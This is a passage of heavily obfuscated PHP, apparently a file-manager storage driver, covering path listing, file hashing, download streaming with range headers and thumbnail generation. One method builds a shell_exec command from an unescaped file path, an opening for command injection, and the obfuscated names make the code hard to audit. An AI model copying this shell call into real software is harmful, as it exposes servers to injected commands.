$ôß¿æÔæ[$İ²ïøªÃ[81]]++; $ğ•ù‹³º = $this->getPathInner($àÃ’Ú‰‚[$İ²ïøªÃ[87]]); $this->infoChildren($ğ•ù‹³º, $ôß¿æÔæ); } else { $ôß¿æÔæ[$İ²ïøªÃ[80]]++; $ôß¿æÔæ[$İ²ïøªÃ[79]] += $àÃ’Ú‰‚[$İ²ïøªÃ[79]]; } } } public function fileSubstr($Î¯¦£—ò, $ÖùªÕÚº, $à•‰¨ÔË) { } public function listAll($á›ÌğĞ) { } public function listAllMake($––üøª—, &$îúı¾†ä) { $µñ¦ìçÕ =& $_SERVER[íïàËŸë]; check_abort_echo(); $¾š“–¥® = $this->listPath($––üøª—, !0); if (!$¾š“–¥®) { return; } $£úò°°© = array_merge($¾š“–¥®[$µñ¦ìçÕ[85]], $¾š“–¥®[$µñ¦ìçÕ[86]]); foreach ($£úò°°© as $°ş±ã±£) { $ÁÅ±²Üº = $°ş±ã±£[$µñ¦ìçÕ[33]] == $µñ¦ìçÕ[78]; $âôœÌúß = array($µñ¦ìçÕ[87] => $°ş±ã±£[$µñ¦ìçÕ[87]], $µñ¦ìçÕ[78] => $ÁÅ±²Üº); if (isset($°ş±ã±£[$µñ¦ìçÕ[79]])) { $âôœÌúß[$µñ¦ìçÕ[79]] = $°ş±ã±£[$µñ¦ìçÕ[79]]; } if (isset($°ş±ã±£[$µñ¦ìçÕ[88]])) { $âôœÌúß[$µñ¦ìçÕ[88]] = $°ş±ã±£[$µñ¦ìçÕ[88]]; } if (!$ÁÅ±²Üº) { $îúı¾†ä[] = $âôœÌúß; continue; } $îúı¾†ä[] = $âôœÌúß; $åÛ ­”Û = $°ş±ã±£[$µñ¦ìçÕ[87]]; $¯©”ı³ = $this->pathDriver; if (substr($°ş±ã±£[$µñ¦ìçÕ[87]], 0, strlen($¯©”ı³)) == $¯©”ı³) { $åÛ ­”Û = substr($åÛ ­”Û, strlen($¯©”ı³)); } $this->listAllMake($åÛ ­”Û, $îúı¾†ä); } } public function listAllSimple($®ßõİ¨Ğ, $Ğû´úÈ = false) { $º³¦¬ã = $this->listAll($®ßõİ¨Ğ); return $this->listAllSimpleMake($º³¦¬ã, $this->getPathOuter($®ßõİ¨Ğ), $Ğû´úÈ); } public function listAllSimpleMake($ÂèÅªşö, $…¼ì§, $ª®Ÿ×İ˜) { $À¤–Ö‡‚ =& $_SERVER[íïàËŸë]; $¤½Â› = array(); $…¼ì§ = rtrim(get_path_father($…¼ì§), $À¤–Ö‡‚[8]) . $À¤–Ö‡‚[8]; foreach ($ÂèÅªşö as $‹¡„¹ŠŠ) { $¯éÎÂŠ = array($À¤–Ö‡‚[87] => $‹¡„¹ŠŠ[$À¤–Ö‡‚[87]], $À¤–Ö‡‚[89] => $‹¡„¹ŠŠ[$À¤–Ö‡‚[87]], $À¤–Ö‡‚[78] => $‹¡„¹ŠŠ[$À¤–Ö‡‚[78]]); if (isset($‹¡„¹ŠŠ[$À¤–Ö‡‚[79]]) && !$‹¡„¹ŠŠ[$À¤–Ö‡‚[78]]) { $¯éÎÂŠ[$À¤–Ö‡‚[79]] = $‹¡„¹ŠŠ[$À¤–Ö‡‚[79]]; } if (isset($‹¡„¹ŠŠ[$À¤–Ö‡‚[88]])) { $¯éÎÂŠ[$À¤–Ö‡‚[88]] = $‹¡„¹ŠŠ[$À¤–Ö‡‚[88]]; } if (is_array($‹¡„¹ŠŠ[$À¤–Ö‡‚[90]])) { $¯éÎÂŠ[$À¤–Ö‡‚[89]] = $‹¡„¹ŠŠ[$À¤–Ö‡‚[90]][$À¤–Ö‡‚[87]]; $¯éÎÂŠ[$À¤–Ö‡‚[79]] = $‹¡„¹ŠŠ[$À¤–Ö‡‚[90]][$À¤–Ö‡‚[79]]; $¯éÎÂŠ[$À¤–Ö‡‚[88]] = $‹¡„¹ŠŠ[$À¤–Ö‡‚[90]][$À¤–Ö‡‚[88]]; } else { if (substr($‹¡„¹ŠŠ[$À¤–Ö‡‚[87]], 0, strlen($…¼ì§)) == $…¼ì§) { $¯éÎÂŠ[$À¤–Ö‡‚[87]] = substr($‹¡„¹ŠŠ[$À¤–Ö‡‚[87]], strlen($…¼ì§)); } } $ºó”Ğ‰‡ = $‹¡„¹ŠŠ[$À¤–Ö‡‚[78]] ? $À¤–Ö‡‚[8] : $À¤–Ö‡‚[12]; $¯éÎÂŠ[$À¤–Ö‡‚[89]] = rtrim($¯éÎÂŠ[$À¤–Ö‡‚[89]], $À¤–Ö‡‚[8]) . $ºó”Ğ‰‡; $¯éÎÂŠ[$À¤–Ö‡‚[87]] = $À¤–Ö‡‚[8] . trim($¯éÎÂŠ[$À¤–Ö‡‚[87]], $À¤–Ö‡‚[8]) . $ºó”Ğ‰‡; if (!$ª®Ÿ×İ˜) { $à…àä¢¿ = explode($À¤–Ö‡‚[8], trim($¯éÎÂŠ[$À¤–Ö‡‚[87]], $À¤–Ö‡‚[8])); $¯éÎÂŠ[$À¤–Ö‡‚[87]] = $À¤–Ö‡‚[8] . implode($À¤–Ö‡‚[8], array_slice($à…àä¢¿, 1)) . $ºó”Ğ‰‡; } $¤½Â›[] = $¯éÎÂŠ; } return array_sort_by($¤½Â›, $À¤–Ö‡‚[87]); } public function upload($øÜá™ø¬, $„Ò…ğ–à, $ªÄ÷¦ê‹ = false, $ÆéÑËŠÁ = REPEAT_REPLACE) { } public function uploadFileByID($¥Í£‚Ö, $Ñ£»Ë¦¨, $¼„Îîë) { } public function uploadFileByPath($£Ú¶£®¶, $Î©¥Ñ´€, $êø€‹ø¾ = array()) { } public function isUploadServer() { $ÕÄ æ„‹ =& $_SERVER[íïàËŸë]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÕÄ æ„‹[91]) { return !0; } return $GLOBALS[$ÕÄ æ„‹[6]][$ÕÄ æ„‹[92]][$ÕÄ æ„‹[93]]; } public function isFileOutServer() { $£É§¯Å° =& $_SERVER[íïàËŸë]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $£É§¯Å°[91]) { return !0; } return $GLOBALS[$£É§¯Å°[6]][$£É§¯Å°[92]][$£É§¯Å°[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($®¤Öõƒ) { $ÚÒŠ §° =& $_SERVER[íïàËŸë]; if (!$this->isCdnHost()) { return $®¤Öõƒ; } return str_replace(trim(get_url_root($®¤Öõƒ), $ÚÒŠ §°[8]), trim($this->cdnHost, $ÚÒŠ §°[8]), $®¤Öõƒ); } public function uploadLink($’Ë¨ÙÁ, $˜»õµÈÈ = 0) { $İ‘…ÀŸ =& $_SERVER[íïàËŸë]; if ($this->isUploadServer()) { return; } $Á²¹¢Ú = $this->getType(); if (!in_array($Á²¹¢Ú, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $„äú«Õ = 1024 * 1024 * 10; $§Å¬ìï– = $˜»õµÈÈ <= $„äú«Õ ? $İ‘…ÀŸ[95] : $İ‘…ÀŸ[96]; $°ñŠ¼§ô = (!$˜»õµÈÈ ? 1 : ceil($˜»õµÈÈ / pow(1024, 3))) * 3600 * 4; $æ­’ğö = $this->{$§Å¬ìï–}($’Ë¨ÙÁ, $°ñŠ¼§ô); if ($æ­’ğö) { $æ­’ğö[$İ‘…ÀŸ[97]] = $’Ë¨ÙÁ; $æ­’ğö[$İ‘…ÀŸ[98]] = $Á²¹¢Ú; } return $æ­’ğö; } public function uploadFormData($½ˆÔä³ò, $µ‹‰È™ô = 3600) { } public function multiUploadFormData($¨¦éõœ¼, $ÏöêÂÑŸ = 3600) { } public function download($ƒŒ§œôŸ, $›‹ÒŸĞ) { } public function ext($‡Ö•í») { $–‡‡´İÖ =& $_SERVER[íïàËŸë]; if (strpos($‡Ö•í», $–‡‡´İÖ[8]) === -1) { $”Ç¤„—í = $‡Ö•í»; } else { $”Ç¤„—í = $this->pathThis($‡Ö•í»); } $‚¹İ¬Ñ = $–‡‡´İÖ[12]; if (strstr($”Ç¤„—í, $–‡‡´İÖ[10])) { $‚¹İ¬Ñ = substr($”Ç¤„—í, strrpos($”Ç¤„—í, $–‡‡´İÖ[10]) + 1); $‚¹İ¬Ñ = strtolower($‚¹İ¬Ñ); } if (strlen($‚¹İ¬Ñ) > 3 && preg_match($–‡‡´İÖ[99], $‚¹İ¬Ñ, $ÊÂ¼œÂ)) { $‚¹İ¬Ñ = $–‡‡´İÖ[12]; } return $‚¹İ¬Ñ; } public function pathThis($ĞÍÒ‘ñ) { $óˆèµ©ı =& $_SERVER[íïàËŸë]; $ĞÍÒ‘ñ = str_replace($óˆèµ©ı[100], $óˆèµ©ı[8], rtrim($ĞÍÒ‘ñ, $óˆèµ©ı[8])); $°·¬šĞ‚ = strrpos($ĞÍÒ‘ñ, $óˆèµ©ı[8]); if ($°·¬šĞ‚ === !1) { return $ĞÍÒ‘ñ; } return substr($ĞÍÒ‘ñ, $°·¬šĞ‚ + 1); } public function pathFather($Öıû´ĞÙ) { $ğ†¶şŸ =& $_SERVER[íïàËŸë]; $Öıû´ĞÙ = str_replace($ğ†¶şŸ[100], $ğ†¶şŸ[8], rtrim($Öıû´ĞÙ, $ğ†¶şŸ[8])); $äÆœà•™ = strrpos($Öıû´ĞÙ, $ğ†¶şŸ[8]); if ($äÆœà•™ === !1) { return $ğ†¶şŸ[12]; } return substr($Öıû´ĞÙ, 0, $äÆœà•™ + 1); } public function hashSimple($¥Ì­ÄÇû) { $Î§Îü£ =& $_SERVER[íïàËŸë]; if (!$¥Ì­ÄÇû) { return md5($Î§Îü£[12]); } $¡Ğá­©Ë = $this->size($¥Ì­ÄÇû); $×õ‰ê•ô = 200; $³æÓéôá = 50; if ($¡Ğá­©Ë <= $×õ‰ê•ô * $³æÓéôá) { return $this->hashMd5($¥Ì­ÄÇû) . $¡Ğá­©Ë; } $õ¼Ã¤‚³ = intval($¡Ğá­©Ë / $³æÓéôá); $Ğß­ì±† = $Î§Îü£[12]; for ($ª¥†´£ = 0; $ª¥†´£ < $³æÓéôá; $ª¥†´£++) { $Ğß­ì±† .= $this->fileSubstr($¥Ì­ÄÇû, $õ¼Ã¤‚³ * $ª¥†´£, $×õ‰ê•ô); } $Ğß­ì±† .= $this->fileSubstr($¥Ì­ÄÇû, $¡Ğá­©Ë - $×õ‰ê•ô, $×õ‰ê•ô); return md5($Ğß­ì±†) . $¡Ğá­©Ë; } public static $md5Cache = array(); public function hashMd5($ğ¹Èæ†¸) { if (!$ğ¹Èæ†¸) { return md5($_SERVER[íïàËŸë][12]); } $ğ¹Èæ†¸ = $this->iconvSystem($ğ¹Èæ†¸); if (isset(self::$md5Cache[$ğ¹Èæ†¸])) { return self::$md5Cache[$ğ¹Èæ†¸]; } self::$md5Cache[$ğ¹Èæ†¸] = $this->hashMd5Shell($ğ¹Èæ†¸); if (!self::$md5Cache[$ğ¹Èæ†¸]) { self::$md5Cache[$ğ¹Èæ†¸] = @md5_file($ğ¹Èæ†¸); } return self::$md5Cache[$ğ¹Èæ†¸]; } private function hashMd5Shell($¯ó‚ˆ) { $êÁóã§ =& $_SERVER[íïàËŸë]; if (!$¯ó‚ˆ) { return md5($êÁóã§[12]); } if (!function_exists($êÁóã§[101])) { return !1; } $Ï Ííà“ = array($êÁóã§[102], $êÁóã§[103]); $ÀÂ¸Œ¢è = Cache::get($êÁóã§[104]); if (!$ÀÂ¸Œ¢è) { $²›ÁëÓí = BASIC_PATH . $êÁóã§[105]; $ØÑ…ú°ã = md5_file($²›ÁëÓí); $ÀÂ¸Œ¢è = $êÁóã§[106]; foreach ($Ï Ííà“ as $ëŠ÷ßË) { $”üÒ°äÅ = shell_exec($ëŠ÷ßË . "\40\42{$²›ÁëÓí}\42"); if ($”üÒ°äÅ && substr(trim($”üÒ°äÅ), 0, 32) == $ØÑ…ú°ã) { $ÀÂ¸Œ¢è = $ëŠ÷ßË; break; } } Cache::set($êÁóã§[104], $ÀÂ¸Œ¢è, 3600); } if ($ÀÂ¸Œ¢è == $êÁóã§[106]) { return !1; } $”üÒ°äÅ = shell_exec($ÀÂ¸Œ¢è . "\x20\42{$¯ó‚ˆ}\42"); $”üÒ°äÅ = str_replace($êÁóã§[107], $êÁóã§[12], $”üÒ°äÅ); return substr($”üÒ°äÅ, 0, 32); } public function link($–ˆ˜·ƒ¢) { return $–ˆ˜·ƒ¢; } public function fileOut($‹Å–¨À¦, $øƒ˜Á— = false, $…ªôë…Ñ = false, $°ÊËŸø = '') { $ãÔ·«Ú‘ =& $_SERVER[íïàËŸë]; $this->cacheMethod(null, null); if (!$‹Å–¨À¦ || !$this->exist($‹Å–¨À¦)) { show_json(LNG($ãÔ·«Ú‘[108]), !1, $…ªôë…Ñ); } $Àì¢¿¬İ = $this->getType() == $ãÔ·«Ú‘[109]; $¯Û©Òƒ = $GLOBALS[$ãÔ·«Ú‘[6]][$ãÔ·«Ú‘[92]][$ãÔ·«Ú‘[110]][$ãÔ·«Ú‘[111]]; $…”¦ÈÓĞ = (double) $GLOBALS[$ãÔ·«Ú‘[6]][$ãÔ·«Ú‘[92]][$ãÔ·«Ú‘[110]][$ãÔ·«Ú‘[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Û„Øª³ä = $this->infoFull($‹Å–¨À¦); $ªôÎÊÛ© = $Û„Øª³ä[$ãÔ·«Ú‘[79]]; $ Îíîï = gmdate($ãÔ·«Ú‘[113], $Û„Øª³ä[$ãÔ·«Ú‘[88]]); $òáÄ™ÚÌ = $…ªôë…Ñ ? $…ªôë…Ñ : $this->iconvApp($Û„Øª³ä[$ãÔ·«Ú‘[32]]); $Æ»‚¸ë¤ = 0; $î½÷Å”Â = $ªôÎÊÛ© - 1; $Èå£Øëê = $this->ext($òáÄ™ÚÌ); if (in_array($Èå£Øëê, array($ãÔ·«Ú‘[114], $ãÔ·«Ú‘[115], $ãÔ·«Ú‘[116], $ãÔ·«Ú‘[117]))) { $Èå£Øëê = $ãÔ·«Ú‘[118]; } if (in_array($Èå£Øëê, array($ãÔ·«Ú‘[119]))) { $Èå£Øëê = $ãÔ·«Ú‘[120]; } if (!$°ÊËŸø) { $°ÊËŸø = md5($ Îíîï . $ªôÎÊÛ©); } $°ÊËŸø = $ãÔ·«Ú‘[121] . $°ÊËŸø . $ãÔ·«Ú‘[121]; $Ä®…Üâ€ = get_file_mime($Èå£Øëê); $Ù§÷Ÿå = !0; $Ù§÷Ÿå = isset($_GET[$ãÔ·«Ú‘[122]]) ? !1 : !0; if ($øƒ˜Á— === !1 && !mime_support($Ä®…Üâ€)) { $Ä®…Üâ€ = $ãÔ·«Ú‘[123]; } header($ãÔ·«Ú‘[124]); header($ãÔ·«Ú‘[125] . $Ä®…Üâ€); $¤ïÑÄ¾ = rawurlencode($òáÄ™ÚÌ); $¤ïÑÄ¾ = $ãÔ·«Ú‘[121] . $¤ïÑÄ¾ . $ãÔ·«Ú‘[126] . $¤ïÑÄ¾; if ($øƒ˜Á—) { header($ãÔ·«Ú‘[127]); header($ãÔ·«Ú‘[128] . $¤ïÑÄ¾); } else { if ($Ù§÷Ÿå) { header($ãÔ·«Ú‘[129] . $¤ïÑÄ¾); } } $äæÖ®¡ = 3600 * 24 * 30; header($ãÔ·«Ú‘[130]); header($ãÔ·«Ú‘[131]); header($ãÔ·«Ú‘[132] . $äæÖ®¡); header($ãÔ·«Ú‘[133] . gmdate($ãÔ·«Ú‘[113], time() + $äæÖ®¡) . $ãÔ·«Ú‘[134]); if (isset($_SERVER[$ãÔ·«Ú‘[135]]) && strtotime($_SERVER[$ãÔ·«Ú‘[135]]) == $Û„Øª³ä[$ãÔ·«Ú‘[88]]) { header($ãÔ·«Ú‘[136], !0, 304); die; } if (isset($_SERVER[$ãÔ·«Ú‘[137]]) && $_SERVER[$ãÔ·«Ú‘[137]] == $°ÊËŸø) { header($ãÔ·«Ú‘[138] . $°ÊËŸø, !0, 304); die; } header($ãÔ·«Ú‘[138] . $°ÊËŸø); header($ãÔ·«Ú‘[139] . $ Îíîï . $ãÔ·«Ú‘[134]); header($ãÔ·«Ú‘[140] . $òáÄ™ÚÌ); header($ãÔ·«Ú‘[141]); header($ãÔ·«Ú‘[142] . $ªôÎÊÛ©); header($ãÔ·«Ú‘[143]); Hook::trigger($ãÔ·«Ú‘[144], $‹Å–¨À¦, $ªôÎÊÛ©, $òáÄ™ÚÌ, $Èå£Øëê); if (!$øƒ˜Á— && $Èå£Øëê == $ãÔ·«Ú‘[145]) { if ($ªôÎÊÛ© > 1024 * 1024 * 5) { die; } $Õ™ †ì = $this->getContent($‹Å–¨À¦); $Õ™ †ì = Html::clearSVG($Õ™ †ì); header($ãÔ·«Ú‘[146] . strlen($Õ™ †ì)); echo $Õ™ †ì; die; } $Œ½±º‡š = strtolower($_SERVER[$ãÔ·«Ú‘[147]]); if ($Àì¢¿¬İ && $Œ½±º‡š && $¯Û©Òƒ) { if (strstr($Œ½±º‡š, $ãÔ·«Ú‘[148])) { header($ãÔ·«Ú‘[149] . $‹Å–¨À¦); } else { if (strstr($Œ½±º‡š, $ãÔ·«Ú‘[150])) { header($ãÔ·«Ú‘[151] . $‹Å–¨À¦); } else { if (strstr($Œ½±º‡š, $ãÔ·«Ú‘[152])) { header($ãÔ·«Ú‘[153] . $‹Å–¨À¦); } } } if ($…”¦ÈÓĞ) { header($ãÔ·«Ú‘[154] . $…”¦ÈÓĞ); } return; } if (isset($_SERVER[$ãÔ·«Ú‘[155]])) { if (preg_match($ãÔ·«Ú‘[156], $_SERVER[$ãÔ·«Ú‘[155]], $ŠùêÙ÷)) { $Æ»‚¸ë¤ = intval($ŠùêÙ÷[1]); $Æ»‚¸ë¤ = $Æ»‚¸ë¤ <= 0 ? 0 : ($Æ»‚¸ë¤ >= $î½÷Å”Â ? $î½÷Å”Â : $Æ»‚¸ë¤); if (!empty($ŠùêÙ÷[2])) { $¶€¿¦Ù³ = intval($ŠùêÙ÷[2]); $î½÷Å”Â = $¶€¿¦Ù³ < $Æ»‚¸ë¤ ? $Æ»‚¸ë¤ : ($¶€¿¦Ù³ >= $î½÷Å”Â ? $î½÷Å”Â : $¶€¿¦Ù³); } } header($ãÔ·«Ú‘[157]); header("\x43\x6f\x6e\x74\x65\156\x74\x2d\122\141\x6e\147\145\72\40\142\171\x74\x65\x73\x20{$Æ»‚¸ë¤}\55{$î½÷Å”Â}\57" . $ªôÎÊÛ©); } else { header($ãÔ·«Ú‘[158]); } header($ãÔ·«Ú‘[159]); header($ãÔ·«Ú‘[160]); $æ¶¿”„æ = !0; if ($_SERVER[$ãÔ·«Ú‘[161]] == $ãÔ·«Ú‘[162] && $ªôÎÊÛ© > 1204 * 1024 * 1024 * 2) { $æ¶¿”„æ = !1; } if ($æ¶¿”„æ) { header($ãÔ·«Ú‘[163] . ($î½÷Å”Â - $Æ»‚¸ë¤ + 1)); } if ($_SERVER[$ãÔ·«Ú‘[164]] == $ãÔ·«Ú‘[165]) { return; } $¢ñïœ“ß = array($ãÔ·«Ú‘[166] => !1, $ãÔ·«Ú‘[167] => $Æ»‚¸ë¤, $ãÔ·«Ú‘[168] => $î½÷Å”Â, $ãÔ·«Ú‘[169] => $Èå£Øëê, $ãÔ·«Ú‘[170] => $Û„Øª³ä, $ãÔ·«Ú‘[171] => $ãÔ·«Ú‘[12], $ãÔ·«Ú‘[172] => 0); $¢ñïœ“ß = Hook::filter($ãÔ·«Ú‘[173], $¢ñïœ“ß); $çà¯è¦š = 1024 * 300; $´“Ø¸Ãò = 0; if ($…”¦ÈÓĞ) { $´“Ø¸Ãò = intval(1000 * 1000 * ($çà¯è¦š / $…”¦ÈÓĞ)); } while ($Æ»‚¸ë¤ <= $î½÷Å”Â) { $ûˆ˜İ²Í = timeFloat(); check_abort(); $’¢Ì€³í = $î½÷Å”Â - $Æ»‚¸ë¤ + 1; if ($’¢Ì€³í <= $çà¯è¦š) { $çà¯è¦š = $’¢Ì€³í; } $Õ™ †ì = $this->fileSubstr($‹Å–¨À¦, $Æ»‚¸ë¤, $çà¯è¦š); if ($¢ñïœ“ß[$ãÔ·«Ú‘[166]]) { $¢ñïœ“ß[$ãÔ·«Ú‘[171]] = $Õ™ †ì; $¢ñïœ“ß[$ãÔ·«Ú‘[172]] = $Æ»‚¸ë¤; $¢ñïœ“ß = Hook::filter($ãÔ·«Ú‘[174], $¢ñïœ“ß); $Õ™ †ì = $¢ñïœ“ß[$ãÔ·«Ú‘[171]]; } echo $Õ™ †ì; $Æ»‚¸ë¤ += $çà¯è¦š; if ($çà¯è¦š == $’¢Ì€³í) { $Æ»‚¸ë¤ = $î½÷Å”Â + 1; } if ($´“Ø¸Ãò) { $âÊ·½İ¿ = intval(1000 * 1000 * (timeFloat() - $ûˆ˜İ²Í)); $õºğÁˆ¯ = $´“Ø¸Ãò - $âÊ·½İ¿; if ($õºğÁˆ¯ > 5) { usleep($õºğÁˆ¯); } } } } public function fileOutServer($Ñ¾äì¬Ê, $‡ÛŠÑ = false, $Ÿ†„âô = false, $µ¨øàş = '') { $this->fileOut($Ñ¾äì¬Ê, $‡ÛŠÑ, $Ÿ†„âô, $µ¨øàş); } public function fileOutLink($™¸¸ÆÆì) { header($_SERVER[íïàËŸë][175] . $™¸¸ÆÆì); die; } public function cacheMethod($®úÜÓ£À, $ŸÔÇÃí«, $¯¼ÒâÆ = null) { $•ùÂ‰¯ =& $_SERVER[íïàËŸë]; static $Ø¨™ÑãÇ = array(); $ƒï‘Ç­Ã = $ŸÔÇÃí« ? ltrim($this->getPathOuter($ŸÔÇÃí«), $•ùÂ‰¯[8]) : $•ùÂ‰¯[12]; $¨¨©¿ğË = $•ùÂ‰¯[176] . $®úÜÓ£À . $•ùÂ‰¯[177] . rtrim($ƒï‘Ç­Ã, $•ùÂ‰¯[8]); if (is_null($®úÜÓ£À)) { $Ø¨™ÑãÇ = array(); return; } if (is_null($ŸÔÇÃí«)) { foreach ($Ø¨™ÑãÇ as $¨¨©¿ğË => $³ïóÜ«õ) { if (!strstr($¨¨©¿ğË, $•ùÂ‰¯[176] . $®úÜÓ£À . $•ùÂ‰¯[178])) { continue; } unset($Ø¨™ÑãÇ[$¨¨©¿ğË]); } return; } if (!is_null($¯¼ÒâÆ)) { $Ø¨™ÑãÇ[$¨¨©¿ğË] = $¯¼ÒâÆ; return; } $³‰·çšÁ = isset($Ø¨™ÑãÇ[$¨¨©¿ğË]) ? $Ø¨™ÑãÇ[$¨¨©¿ğË] : null; if (!is_null($³‰·çšÁ)) { return $³‰·çšÁ; } $³‰·çšÁ = $this->{$®úÜÓ£À}($ŸÔÇÃí«); $Ø¨™ÑãÇ[$¨¨©¿ğË] = $³‰·çšÁ; return $³‰·çšÁ; } public function cacheMethodInfoSet($ÅªÒøñ‰, $Ò½• Áİ, $Í®Ÿá = false) { $ªóáßŸ =& $_SERVER[íïàËŸë]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ªóáßŸ[179], $ÅªÒøñ‰, $Ò½• Áİ); $this->cacheMethod($ªóáßŸ[180], $ÅªÒøñ‰, $Ò½• Áİ ? !1 : !0); if (is_array($Í®Ÿá)) { $this->cacheMethod($ªóáßŸ[181], $ÅªÒøñ‰, $Í®Ÿá); } } public function fileOutImage($¤ğÁìÜó, $Ñ¦Õ²¬ = 250) { $„Ï—Í“è =& $_SERVER[íïàËŸë]; set_timeout(); if (substr($¤ğÁìÜó, 0, 4) == $„Ï—Í“è[152]) { $this->fileOutLink($¤ğÁìÜó); } $óíşü‘ = $this->info($¤ğÁìÜó); $áçìó… = !1; $—áÓí = isset($GLOBALS[$„Ï—Í“è[182]]) ? $GLOBALS[$„Ï—Í“è[182]] : array(); if ($—áÓí && $—áÓí[$„Ï—Í“è[183]] == $óíşü‘[$„Ï—Í“è[87]]) { $óíşü‘ = $—áÓí; $Ü±Ì­ã¶ = $óíşü‘[$„Ï—Í“è[184]]; if ($Ü±Ì­ã¶ && isset($Ü±Ì­ã¶[$„Ï—Í“è[185]])) { if ($Ü±Ì­ã¶[$„Ï—Í“è[185]] <= $Ñ¦Õ²¬ && $Ü±Ì­ã¶[$„Ï—Í“è[186]] <= $Ñ¦Õ²¬) { $áçìó… = !0; } } } if ($óíşü‘[$„Ï—Í“è[79]] <= 1024 * 50 || $áçìó… || !function_exists($„Ï—Í“è[187]) || $óíşü‘[$„Ï—Í“è[169]] == $„Ï—Í“è[188]) { return $this->fileOut($¤ğÁìÜó, !1, $óíşü‘[$„Ï—Í“è[32]]); } $©Æ”–¦ = kodIO::hashPath($óíşü‘); $ı·»ëêÒ = "\143\157\x76\x65\162\x5f{$©Æ”–¦}\137{$Ñ¦Õ²¬}\x2e\160\156\147"; $Ç²Œ¡Ä = IO_PATH_SYSTEM_TEMP . $„Ï—Í“è[189]; $é¯†ôÉâ = IO::infoFullSimple($Ç²Œ¡Ä); $¬÷½Ş´š = $é¯†ôÉâ && is_array($é¯†ôÉâ) ? $é¯†ôÉâ[$„Ï—Í“è[87]] : $„Ï—Í“è[12]; if (!$¬÷½Ş´š) { $¬÷½Ş´š = IO::mkdir($Ç²Œ¡Ä); } if ($óíşü‘[$„Ï—Í“è[190]] == $„Ï—Í“è[191] && isset($óíşü‘[$„Ï—Í“è[192]]) && $óíşü‘[$„Ï—Í“è[192]] == kodIO::sourceID($¬÷½Ş´š)) { $–ÍÜ¸„Ì = $óíşü‘[$„Ï—Í“è[193]]; if ($Ñ¦Õ²¬ <= 500) { $İÕıø‡¿ = preg_replace($„Ï—Í“è[194], $„Ï—Í“è[195], $óíşü‘[$„Ï—Í“è[32]]); $–ÍÜ¸„Ì = IO::fileNameExist($¬÷½Ş´š, $İÕıø‡¿); } return IO::fileOut(KodIO::make($–ÍÜ¸„Ì), !1, $óíşü‘[$„Ï—Í“è[32]]); } $ª½ò©–† = IO::fileNameExist($¬÷½Ş´š, $ı·»ëêÒ); if ($ª½ò©–†) { return IO::fileOut(KodIO::make($ª½ò©–†), !1, $óíşü‘[$„Ï—Í“è[32]]); } if ($Ñ¦Õ²¬ > 1000) { $this->makeImageCover($¬÷½Ş´š, $¤ğÁìÜó, $ı·»ëêÒ, $Ñ¦Õ²¬); $this->makeImageCover($¬÷½Ş´š, $¤ğÁìÜó, "\143\x6f\166\145\x72\x5f{$©Æ”–¦}\x5f\62\65\60\56\x70\156\147", 250); $ª½ò©–† = IO::fileNameExist($¬÷½Ş´š, $ı·»ëêÒ); if ($ª½ò©–†) { return IO::fileOut(KodIO::make($ª½ò©–†), !1, $óíşü‘[$„Ï—Í“è[32]]); } die; } $ùé˜² = Cache::get($ı·»ëêÒ); if ($ùé˜² == $„Ï—Í“è[196] || $ùé˜² == $„Ï—Í“è[197]) { echo $ùé˜²; die; } Cache::set($ı·»ëêÒ, $„Ï—Í“è[197], 60); $ğ™É£‘ = array($¬÷½Ş´š, $óíşü‘[$„Ï—Í“è[87]], $ı·»ëêÒ, $Ñ¦Õ²¬); $›©ªÅ£ = $„Ï—Í“è[198] . $óíşü‘[$„Ï—Í“è[79]] . $„Ï—Í“è[199] . $ı·»ëêÒ . $„Ï—Í“è[200] . $óíşü‘[$„Ï—Í“è[32]] . $„Ï—Í“è[201] . $óíşü‘[$„Ï—Í“è[87]]; TaskQueue::add($„Ï—Í“è[202], $ğ™É£‘, $›©ªÅ£, $ı·»ëêÒ); } public function makeImageCover($¦ØÍ¡ˆ, $¾ûÜŸËş, $…¾®Şìç, $ƒËúçË¶) { $ñšá†•Û =& $_SERVER[íïàËŸë]; if (IO::fileNameExist($¦ØÍ¡ˆ, $…¾®Şìç)) { return $ñšá†•Û[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $åµ­¬©â = DATA_THUMB . $…¾®Şìç; del_file($åµ­¬©â); $†»ÌøäÅ = TEMP_FILES . $…¾®Şìç; if (!@file_exists($†»ÌøäÅ)) { $†»ÌøäÅ = $this->download($¾ûÜŸËş, $†»ÌøäÅ); } if (!@file_exists($†»ÌøäÅ)) { return $ñšá†•Û[204]; } ImageThumb::createThumb($†»ÌøäÅ, $åµ­¬©â, $ƒËúçË¶, $ƒËúçË¶ * 10); if (@file_exists($åµ­¬©â)) { Cache::remove($…¾®Şìç); return IO::move($åµ­¬©â, $¦ØÍ¡ˆ); } Cache::set($…¾®Şìç, $ñšá†•Û[196], 600); del_file($åµ­¬©â); return $ñšá†•Û[205] . $†»ÌøäÅ . $ñšá†•Û[74]; } public function fileOutImageServer($»½áş‘, $÷ïºåŠ = 250) { $this->fileOutImage($»½áş‘, $÷ïºåŠ); } public function fileNameAuto($ËÔ×ˆì®, $ Ášæğ, $Í»Ğ¹Óˆ = REPEAT_RENAME, $›çÈó¢· = false) { $ã®ß¤‹Ë =& $_SERVER[íïàËŸë]; $ìŠÅÀ¦Û = $ËÔ×ˆì® === $ã®ß¤‹Ë[12] ? $ Ášæğ : rtrim($ËÔ×ˆì®, $ã®ß¤‹Ë[8]) . $ã®ß¤‹Ë[8] . $ Ášæğ; if ($Í»Ğ¹Óˆ == REPEAT_REPLACE || !$this->exist($ìŠÅÀ¦Û) || $›çÈó¢· && $Í»Ğ¹Óˆ != REPEAT_RENAME_FOLDER) { return $ Ášæğ; } if ($Í»Ğ¹Óˆ == REPEAT_SKIP) { return !1; } $ğ¢ïó«½ = $ã®ß¤‹Ë[10] . get_path_ext($ Ášæğ); $ğ¢ïó«½ = $ğ¢ïó«½ == $ã®ß¤‹Ë[10] || $›çÈó¢· ? $ã®ß¤‹Ë[12] : $ğ¢ïó«½; $ÈÛšË·Ñ = 1; $òİ¬«’¼ = substr($ Ášæğ, 0, strlen($ Ášæğ) - 